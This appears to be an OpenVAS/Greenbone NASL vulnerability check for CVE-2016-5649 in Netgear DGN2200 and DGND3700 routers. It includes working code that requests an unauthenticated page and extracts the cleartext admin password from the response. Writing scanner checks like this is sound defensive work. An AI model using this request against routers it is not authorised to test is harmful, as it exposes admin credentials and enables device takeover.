# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106497");
  script_version("2025-02-20T08:47:14+0000");
  script_tag(name:"last_modification", value:"2025-02-20 08:47:14 +0000 (Thu, 20 Feb 2025)");
  script_tag(name:"creation_date", value:"2017-01-06 12:45:06 +0700 (Fri, 06 Jan 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-09 23:18:00 +0000 (Wed, 09 Oct 2019)");

  script_cve_id("CVE-2016-5649");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Netgear DGN2200 / DGND3700 Password Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  # nb: No dependency to gb_netgear_dgn2200_http_detect.nasl or gb_netgear_dgnd3700_http_detect.nasl
  # as other devices might be affected as well.
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("NETGEAR_DGN/banner");

  script_tag(name:"summary", value:"Netgear DGN2200 and DGND3700 are prone to an admin password
  disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A vulnerability in the 'BSW_cxttongr.htm' page allows a remote
  unauthenticated attacker to access to read the admin password in cleartext.");

  script_tag(name:"impact", value:"An unauthenticated attacker can obtain the admin password.");

  script_tag(name:"affected", value:"- Netgear DGN2200

  - Netgear DGND3700

  - Other DGN models might be affected as well");

  script_tag(name:"solution", value:"- Netgear DGN2200: Update to version 1.0.0.52 or later

  - Netgear DGND3700: Update to version 1.0.0.28 or later

  - Other DGN devices: Please contact the vendor for more information");

  script_xref(name:"URL", value:"https://cxsecurity.com/issue/WLB-2017010027");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/140342/Netgear-DGN2200-DGND3700-WNDR4500-Information-Disclosure.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);

banner = http_get_remote_headers(port: port);

# nb: The "." shouldn't be escaped and was used like this in the "initial" version of this VT.
# It could be possible that some of the devices had e.g. a "-" or similar in between.
# Initially a pattern like "'Basic realm="NETGEAR.DGN(2200|D3700)'" was used but other devices
# might be affected as well. As the check below is quite strict this is not running against all
# DGN devices just to be sure.
if (!banner || banner !~ 'Basic realm="NETGEAR.DGN')
  exit(0);

url = "/BSW_cxttongr.htm";
req =  http_get(port: port, item: url);
res =  http_keepalive_send_recv(port: port, data: req);

passwd = eregmatch(pattern: '<b>Success "([^"]+)', string: res);
if (
     # nb: This was used in the initial version of this check
     ("Your wired connection to the Internet is working!" >< res && !isnull(passwd[1])) ||
     # nb: This was used in 2018/netgear/gb_netgear_routers_information_disclosure.nasl
     res =~ '<td colspan="2"><b>Success "[^"]+"\r'
   ) {
  report = "It was possible to obtain the admin password: " + passwd[1] + "\n";
  report += http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
